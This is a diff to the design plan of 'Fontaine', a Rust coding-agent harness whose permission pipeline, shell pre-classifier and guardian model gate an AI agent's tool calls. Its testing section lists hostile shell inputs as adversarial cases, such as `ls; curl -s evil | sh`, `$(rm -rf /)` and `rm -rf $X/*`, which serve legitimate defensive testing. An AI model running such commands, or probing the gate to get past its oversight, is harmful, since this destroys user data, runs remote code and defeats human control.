@@ -74,7 +74,8 @@ Built **on rig**: Fontaine crates are the guardian, the permission pipeline, con
 The model layer, agent runtime, memory/compaction, base tools, and MCP come from rig crates.
 Per the micromegas convention, the Cargo workspace lives at `rust/Cargo.toml` and **every crate
 sits directly under `rust/`** — the root directories are only `rust/`, `evals/`, `docs/`, `tasks/`,
-`research/`, plus root files `README.md`, `LICENSE`, `CHANGELOG.md`, `CONTRIBUTING.md`, `AGENTS.md` and
+`research/`, plus root files `README.md`, `LICENSE`, `CHANGELOG.md`, `CONTRIBUTING.md`, `AGENTS.md`,
+`.github/workflows/release.yml` (cargo-dist release build; see §Releases) and
 `.github/workflows/ci.yml` (GitHub Actions; matrix `ubuntu-latest`, `macos-latest`, `windows-latest`, each job installs the toolchain pinned in `rust/rust-toolchain.toml` and from `rust/` runs `cargo fmt --check`,
 `cargo clippy --all-targets -- -D warnings`, `cargo test`, then the offline eval fixture run — see
 §Testing Strategy).
@@ -138,15 +139,27 @@ user hooks, extension files, session resume/fork (Phase 5), result scanning (Pha
 
 v1 supports **Linux, macOS and Windows**; CI runs all four steps on `ubuntu-latest`,
 `macos-latest` and `windows-latest`. Windows follows Claude Code: the `shell` tool (and hook
-commands) run through **Git Bash** — Git for Windows is a prerequisite, and a missing install is a
-startup error naming it — so the POSIX shlex lexer, Tier 0.5, rule matching and the critical-path
-check apply unchanged. A PowerShell tool is backlog (GitHub issue #28); it would never
+commands) run through **Git Bash** — Git for Windows is a prerequisite — so the POSIX shell parser, Tier 0.5, rule matching and the critical-path
+check apply unchanged. Discovery: locate `git.exe` on PATH (then the standard Git for Windows install
+locations), derive `<Git>\usr\bin` and `<Git>\bin`, and prepend both to the shell launcher's PATH
+(rig-tools `Launcher::with_env`) so rig's `sh` resolves; `FONTAINE_GIT_BASH_PATH` overrides discovery
+(Claude Code's `CLAUDE_CODE_GIT_BASH_PATH`); not found ⇒ startup error on Windows (exit 2, message
+naming Git for Windows and the override). Hook commands use the same discovery. A PowerShell tool is backlog (GitHub issue #28); it would never
 pre-classify. Path handling (scope validator, protected paths, critical-path) accepts drive
 letters, UNC paths, MSYS-style `/c/...` argv paths (translated to drive paths before validation; an
 untranslatable one is out of scope), compares case-insensitively, and resolves junctions and
 symlinks. Critical paths on Windows include drive roots and `%USERPROFILE%`. The containment probe
 (Phase 4 step 5; Linux cgroup-namespace and `/.dockerenv` checks only) reports "not contained" on macOS and Windows; `--in-container` stays a manual assertion
 that is never sufficient alone.
+
+### Releases
+
+semver 0.x, git tags `vX.Y.Z`. GitHub Releases carry prebuilt binaries for Linux, macOS and Windows
+built by cargo-dist (exact-pinned version; workflow `.github/workflows/release.yml`, set up in Phase 4,
+the first phase that produces a release); `cargo install` from git/crates.io also works. The
+maintainer cuts releases — tagging and pushing the tag are human steps, never the agent's.
+`CHANGELOG.md` follows Keep a Changelog: entries accumulate under `## [Unreleased]`, which moves under
+the version heading at release. The README install section lists both install paths.
 
 Directories come from the `dirs` crate: config dir = `dirs::config_dir()/fontaine` (Linux
 `~/.config/fontaine`; macOS and Windows platform defaults, Windows under `%APPDATA%`), data dir =
@@ -184,11 +197,13 @@ session ledger, debug file — are mode 0600 on Unix and carry a current-user-on
               guardian in `auto`, Deny in `dontAsk`; in `plan` edit-class is already blocked outright
               (Claude Code's protected-paths behavior). In headless `-p` every prompt outcome is a Deny. All
               structured matching (tool name + risk metadata + path containment), never regex on raw
-              args. For `shell` calls the critical-path check lexes the command with the same shlex
-              lexer as Tier 0.5 and inspects the targets of every `rm`/`rmdir` word (exact word
+              args. For `shell` calls the critical-path check parses the command with the same
+              `brush-parser` pass as Tier 0.5 and inspects the targets of every `rm`/`rmdir` word (exact word
               equality), resolving each against the call's `cwd` argument (the model-supplied
               `ShellArgs.cwd`, not the process cwd); a target it cannot resolve (command substitution, variable-rooted glob), or
-              a command that fails to lex while containing such a word, is treated as critical.
+              a command that fails to parse, or parses as anything but one simple command, while
+              containing an `rm`/`rmdir` word anywhere (every segment of `;`/`|`/`&&`/`||` lists is
+              inspected), is treated as critical.
            3. mode == plan?  → no edit ever executes: ReadOnly-in-scope, Tier-0.5-eligible and
               allow-rule-matched non-edit calls proceed (steps 4–5a); everything else reaches the
               terminal plan-mode branch 9.
@@ -202,9 +217,10 @@ session ledger, debug file — are mode 0600 on Unix and carry a current-user-on
                the `skill` tool qualifies: its only argument is a skill name resolved against the
                start-time index, and it loads skill text into context)
            5. Tier 0.5 — deterministic shell pre-classifier (zero-LLM), `shell` calls only:
-              lexically parsed (shlex/AST — NOT regex) into ONE simple command (no pipelines,
-              `;`/`&&` chaining, redirections, command substitution, backgrounding, globs —
-              anything exotic falls through) AND argv[0]+subcommand ∈ curated read-only set
+              parsed by `brush-parser` (a real POSIX shell parser, pinned to an exact version — NOT
+              regex, no hand-rolled lexer) into exactly ONE simple command (no control operators
+              `; | & && ||`, redirections, substitutions, subshells, backgrounding, globs —
+              anything else falls through) AND argv[0]+subcommand ∈ curated read-only set
               (`ls`, `pwd`, `wc`, `file`, `git status|log|diff|show`, `rg`/`grep`,
               `cat`/`head`/`tail`) AND every remaining token is either a path argument passing
               the step-4 scope validator (symlink-resolved; absolute / out-of-workspace paths
@@ -300,7 +316,7 @@ Matching is structured — never regex on raw args.
 
 | Tool | Specifier | Match |
 |---|---|---|
-| `shell` | words, optional trailing ` *` (`shell(git push)`, `shell(npm run test *)`) | argv from the Tier-0.5 shlex lexer: exact argv, or argv prefix when the rule ends in ` *`; no wildcard inside a word |
+| `shell` | words, optional trailing ` *` (`shell(git push)`, `shell(npm run test *)`) | argv from the Tier-0.5 `brush-parser` pass (quoted words stay one argument): exact argv, or argv prefix when the rule ends in ` *`; no wildcard inside a word |
 | `read`, `edit`, `write`, `ls`, `glob`, `grep` | gitignore-style path pattern (`src/**`, `~/.aws/**`, `//etc/hosts`) | relative patterns anchor at each workspace root; the path argument is resolved by the scope validator (symlinks, `..`, the call's `cwd`) and the resolved path is matched |
 | `webfetch` | `domain:<host>` or `domain:*.<host>` | parsed URL host (lowercased, IDNA-normalized); `*.` matches subdomains only |
 | MCP | `mcp__<server>`, `mcp__<server>__<tool>`, `mcp__<server>__*` | registered tool name |
@@ -312,9 +328,9 @@ unlisted one.
 
 **Asymmetric failure.** Deny and ask fail toward matching; allow fails toward not matching. A
 `shell` deny/ask rule is always a prefix match (trailing ` *` implied) and matches when its words appear
-contiguously anywhere in the lexed word stream (control operators split off first, so `ls && git push`
+contiguously anywhere in the parsed word stream (control operators split off first, so `ls && git push`
 and `sudo git push -f` hit `deny shell(git push)`),
-and a command that fails to lex, or puts a substitution or variable in command position, matches every
+and a command that fails to parse, or puts a substitution or variable in command position, matches every
 deny/ask `shell` rule whose first word appears in it (the critical-path posture). A `shell` allow rule
 matches only a command the Tier-0.5 parser accepts as one simple command (no chaining, pipes,
 redirections, substitution, globs) whose argv matches; anything else falls through. Path deny/ask
@@ -516,7 +532,7 @@ model = "work/claude-sonnet-4-6"  # `<account>/<model>`; the account provides th
 model = "work/claude-haiku-5-5"   # `<account>/<model>`, may be a different account than [model]; optional; unset ⇒ top-ranked
                                   #   validated guardian model available on any configured account (see the Phase 4 plan)
 profile = "full"                  # "full" | "minimal" — minimal is the container-mode narrowing (never off):
-                                  #   escape-class ruleset + reduced context on a cheap validated model; requires
+                                  #   escape-class ruleset + reduced context on the resolved `model` above; requires
                                   #   Fontaine-verified containment; loosening knob ⇒ user-scope only, never
                                   #   project-settable; see the Phase 4 plan
 timeout_secs = 30
@@ -595,7 +611,10 @@ subagent_cost_budget_usd = 2.0    # per-subagent spend cap (same enforcement)
 allow_extra = []                  # user extensions to the curated read-only command set — one
                                   #   mode-agnostic list, applying in every mode (the pre-classifier
                                   #   runs before the mode branches); Fontaine
-                                  #   never auto-extends it from observed usage
+                                  #   never auto-extends it from observed usage. Each entry is a
+                                  #   command name or a `command subcommand` pair; no flags are
+                                  #   allowed (any flag falls through to the guardian) and positional
+                                  #   arguments must be in-scope paths; user-scope only
 
 [telemetry]                        # off unless enabled (Claude Code parity)
 enabled = false                    # true REQUIRES `endpoint` and an ingestion key (below); either
@@ -887,13 +906,13 @@ workspace.package block with edition 2024 and rust-version 1.97.1; rig crates pi
 `rust/fontaine-core/src/{lib,models,dirs,permissions,permission_rules,destructive,config,trust,session,ledger,hooks,user_hooks,extensions,audit,containment}.rs`;
 `rust/fontaine-tools/src/{lib,gate,guarded,result_pipeline,risk,scope,builtins,webfetch,preclassify,skill}.rs`;
 `rust/fontaine-guardian/src/{lib,verdict,prompt_builder,rules,cache,profile,scanner}.rs` +
-`rust/fontaine-guardian/prompts/guardian_prompt.md` + `rust/fontaine-guardian/data/guardian_models.toml`;
+`rust/fontaine-guardian/prompts/{guardian_prompt,guardian_minimal}.md` + `rust/fontaine-guardian/data/guardian_models.toml`;
 `rust/fontaine-mcp/src/{lib,servers,register}.rs`;
 `rust/fontaine-agents/src/{lib,spawn,registry,budget}.rs`;
 `rust/fontaine-tui/src/{app,transcript,approval,denials,statusbar,agents_panel,trust_prompt}.rs`;
 `rust/fontaine/src/{main,headless}.rs` + `rust/fontaine/src/telemetry/{mod,span_bridge,micromegas,otlp}.rs`;
 `docs/{index,architecture,configuration,headless,telemetry,tools,permissions,guardian,evals,tui,mcp,agents,hooks,extensions,sandboxing}.md`;
-`README.md`, `LICENSE`, `CHANGELOG.md`, `CONTRIBUTING.md`, `.github/workflows/ci.yml`; `evals/` dataset +
+`README.md`, `LICENSE`, `CHANGELOG.md`, `CONTRIBUTING.md`, `.github/workflows/ci.yml`, `.github/workflows/release.yml`; `evals/` dataset +
 `rust/fontaine-evals/` runner. Each phase plan lists its own file slice in dependency
 order. No `fontaine-llm` crate — the model layer is rig.
 
@@ -933,7 +952,7 @@ order. No `fontaine-llm` crate — the model layer is rig.
 - **Read-only fast path (user-approved hybrid) + Tier 0.5 pre-classifier** — skips guardian latency on
   the highest-frequency calls (Claude Code does the same: dedicated Read/Grep/Glob tools and a
   built-in read-only Bash command set). The scope check (workspace containment, symlink resolution)
-  and the pre-classifier (lexer + curated set membership + per-command read-only flag allowlist +
+  and the pre-classifier (`brush-parser` + curated set membership + per-command read-only flag allowlist +
   the same scope validator) are
   deterministic code enforced by Fontaine at the execution boundary, not regex-on-args and not the
   tool's own declaration; a read that escapes scope, and any command the classifier cannot fully
@@ -1015,7 +1034,7 @@ carries the reasoning:
   skipping, deny-with-explanation) Fontaine copies Claude Code's documented semantics; any
   deviation gets a dated line in Decisions with a one-line reason. (User directive.)
 - 2026-10-21: composite tools + Tier 0.5 — dedicated first-party read tools (`ls`/`read`/
-  `glob`/`grep`) plus a deterministic, zero-LLM shell pre-classifier (structural: shlex/AST lexing
+  `glob`/`grep`) plus a deterministic, zero-LLM shell pre-classifier (structural: `brush-parser` parsing
   + curated read-only set membership + per-command read-only flag allowlist + the step-4 scope
   validator; never regex-on-args; fail-through on anything unparsed) as a guardian-skipping fast path; curated set ships conservative,
   user-extensible via the `[shell_preclassifier] allow_extra` key — one mode-agnostic list
@@ -1117,7 +1136,7 @@ carries the reasoning:
   project hook's `allow` decision is ignored, and a project skill's `allowed-tools` is ignored; Claude
   Code honors project allow rules once the folder is trusted. Reason: project scope can only tighten.
 - 2026-10-21: deliberate Claude-Code deviation — `shell` rule matching: deny/ask rules always match
-  as a prefix and anywhere in the lexed word stream, and anything unlexable that contains the rule's
+  as a prefix and anywhere in the parsed word stream, and anything unparseable that contains the rule's
   first word matches; an allow rule matches only one simple command the Tier-0.5 parser accepts, so a
   compound command never matches an allow rule (Claude Code splits compound commands and requires
   every part to match). Reason: no regex and no operator-level parser in v1, so deny/ask fail toward
@@ -1198,7 +1217,7 @@ carries the reasoning:
   the main model with the one-time notice — and the Phase 4 scorecard run fills it.
 - 2026-10-21: v1 supports Linux, macOS and Windows; CI matrix `ubuntu-latest`, `macos-latest`,
   `windows-latest` on all four CI steps. Windows (Claude Code parity): `shell` runs through Git
-  Bash (Git for Windows is a prerequisite), so the lexer, Tier 0.5 and critical-path apply
+  Bash (Git for Windows is a prerequisite), so the shell parser, Tier 0.5 and critical-path apply
   unchanged; a PowerShell tool is backlog (GitHub issue #28) and would never pre-classify; owner-only
   files use current-user-only ACLs; the containment probe reports "not contained".
 - 2026-10-21: deliberate Claude-Code deviation — every configured `[accounts.*] api_key_env` name,
@@ -1216,6 +1235,26 @@ carries the reasoning:
   confirms it.
 - 2026-10-21: the `skill` tool stays `ReadOnly` and on the fast path (it only loads skill text from
   the start-time index into context); a skill's `!cmd` is gated as a `shell` call.
+- 2026-10-21 (user): shell parsing uses `brush-parser` (exact-pinned; verified 0.4.0) for Tier 0.5, the
+  critical-path check and `shell` rule matching — no hand-rolled lexer, and the `shlex` crate is not
+  used. Soundness unchanged: anything not exactly one simple command falls through to the guardian;
+  for the floor, any `rm`/`rmdir` word in an unparseable or compound command is critical.
+- 2026-10-21 (user): Windows Git Bash discovery — `git.exe` on PATH or standard install locations,
+  `<Git>\usr\bin` + `<Git>\bin` prepended to the launcher PATH, `FONTAINE_GIT_BASH_PATH` override
+  (parity with `CLAUDE_CODE_GIT_BASH_PATH`), not found ⇒ exit 2 at startup; hooks share it.
+- 2026-10-21 (user): `[shell_preclassifier] allow_extra` entries are a command or `command subcommand`
+  pair, flag-free (any flag falls through) with positional args validated as in-scope paths.
+- 2026-10-21 (user): `webfetch` v1 takes `url` only; HTML → markdown via `htmd` (exact-pinned; verified
+  0.5.6); 10 MB fetch cap, 100,000-character output cap (truncation noted), 30 s timeout. Deliberate
+  Claude-Code deviation: Claude Code's `prompt` argument with small-model post-processing is not in v1
+  (backlog) — reason: keeps `webfetch` a single deterministic tool with no extra model call.
+- 2026-10-21 (user): the minimal guardian profile uses the resolved `[guardian] model` (no separate
+  model key); its reduced ruleset is `rust/fontaine-guardian/prompts/guardian_minimal.md`, versioned
+  alongside `guardian_prompt.md`.
+- 2026-10-21 (user): releases — semver 0.x, tags `vX.Y.Z`; GitHub Releases with prebuilt Linux, macOS
+  and Windows binaries built by cargo-dist (exact-pinned; verified 0.32.0) plus `cargo install` from
+  git/crates.io; the maintainer cuts releases (tagging and pushing are human steps); CHANGELOG follows
+  Keep a Changelog. Workflow set up in Phase 4, the first phase that produces a release.
 
 ## Documentation
 
@@ -1270,8 +1309,11 @@ delivered (or extended) by the docs step of the phase named with it — see the 
   asset, so its format doc ships with it.
 - `CONTRIBUTING.md` (repo root, Phase 0): build/test commands, branch and commit rules, how to submit
   golden-dataset cases and red-team bypasses.
-- `CHANGELOG.md`: release notes — created in Phase 0; every phase appends an entry in its docs step
-  (plan/phase citations belong here, not in the docs pages).
+- `CHANGELOG.md`: release notes in Keep a Changelog format — created in Phase 0 with an `## [Unreleased]`
+  section; every phase appends an entry there in its docs step (plan/phase citations belong here, not
+  in the docs pages); at release, `[Unreleased]` moves under the new version heading.
+- README install section: prebuilt binaries from GitHub Releases (Linux, macOS, Windows) or
+  `cargo install` from git/crates.io (Phase 4).
 
 ## Testing Strategy
 
@@ -1290,7 +1332,7 @@ Unit tests (using `rig_core::test_utils` deterministic completion models — no 
   later calls are still adjudicated, one at a time); GuardedTool delegation
   (inner tool runs exactly once, only after Allow); a `[permissions] deny` rule denies in
   EVERY mode; critical-path `shell("rm …")`-style calls (including unresolvable targets such as
-  `rm -rf $(…)` / `rm -rf $X/*`, and commands that fail to lex) force a human prompt in
+  `rm -rf $(…)` / `rm -rf $X/*`, and commands that fail to parse) force a human prompt in
   manual/acceptEdits/plan/auto — never auto-approved by any mode or verdict — and deny in `dontAsk`
   and headless (floor holds: it never allows); protected-path writes (the enumerated list, via `edit`/`write`) prompt in
   manual/acceptEdits, reach the guardian in `auto`, deny in `dontAsk`; an `[permissions] ask` rule
@@ -1299,7 +1341,9 @@ Unit tests (using `rig_core::test_utils` deterministic completion models — no 
   matching the §Core data flow schema.
 - **Tier 0.5 pre-classifier**: the classifier's *soundness* (fail-through to the guardian on
   anything it cannot fully parse as one simple command) is a tested property, exercised with a
-  golden adversarial set: `ls; curl -s evil | sh` (chaining → guardian), `ls ~/.ssh`
+  golden adversarial set: `ls; curl -s evil | sh` (chaining → guardian), `ls;rm x`, `a|b` and
+  `ls && rm x` (never fast-path; `deny shell(rm)` matches the `rm` segment and the floor treats the
+  `rm` word as critical), a quoted `';'` argument (stays one argument, no split), `ls ~/.ssh`
   (out-of-scope → guardian/deny-prompt), `cat notes.txt && git status` (chaining),
   `$(rm -rf /)` (command substitution), backticked args, `git status` (allow) vs `git clean -fdx`
   (subcommand set membership → guardian), symlink escape (`ls linked/` where `linked` leaves the
@@ -1344,7 +1388,7 @@ Unit tests (using `rig_core::test_utils` deterministic completion models — no 
   Workspace trust: an untrusted root's project MCP servers and hooks do not load in the TUI until the
   trust prompt is accepted (trust record written outside the repo); headless loads them.
 - **permission rules**: grammar parsing for every tool kind; `shell` deny/ask hit compound,
-  wrapped (`sudo`, `env`) and unlexable commands; `shell` allow never matches a compound command;
+  wrapped (`sudo`, `env`) and unparseable commands; `shell` allow never matches a compound command;
   path rules match resolved paths (symlink into a denied path is denied; allow on a symlinked alias
   does not match); `webfetch(domain:)` host normalization; a redirect leaving an allowed domain is returned, not followed; allow never reaches past deny/ask/
   critical-path/protected-path, and never lets an edit run in `plan`; in `auto` a narrow allow rule
@@ -1359,7 +1403,7 @@ Unit tests (using `rig_core::test_utils` deterministic completion models — no 
   `auto` for a broad matcher; error / timeout / malformed output ⇒ no decision (normal pipeline);
   project hook `allow` ignored; hook children get the scrubbed environment (no configured
   `api_key_env` variable, `scanner_hf_token_env`, telemetry credential or `MICROMEGAS_*`).
-- **platforms** (Windows cases `#[cfg(windows)]`, run in the windows CI job; locally they are compile-checked with `cargo check --all-targets --target x86_64-pc-windows-gnu`): path normalization and
+- **platforms** (Windows cases `#[cfg(windows)]`, run in the windows CI job; locally they are compile-checked with `cargo check --all-targets --target x86_64-pc-windows-gnu`): Git Bash discovery (PATH, standard install locations, `FONTAINE_GIT_BASH_PATH` override, not-found ⇒ exit 2; the `<Git>\usr\bin` / `<Git>\bin` derivation is a platform-independent unit test); path normalization and
   containment (drive letters, UNC, case-insensitive comparison, junction and symlink escape, MSYS-style
   `/c/...` argv paths); critical-path drive root and `%USERPROFILE%`; owner-only ACL on credentials,
   trust store and audit log; `dirs` resolution and the `FONTAINE_CONFIG_DIR` / `FONTAINE_DATA_DIR`
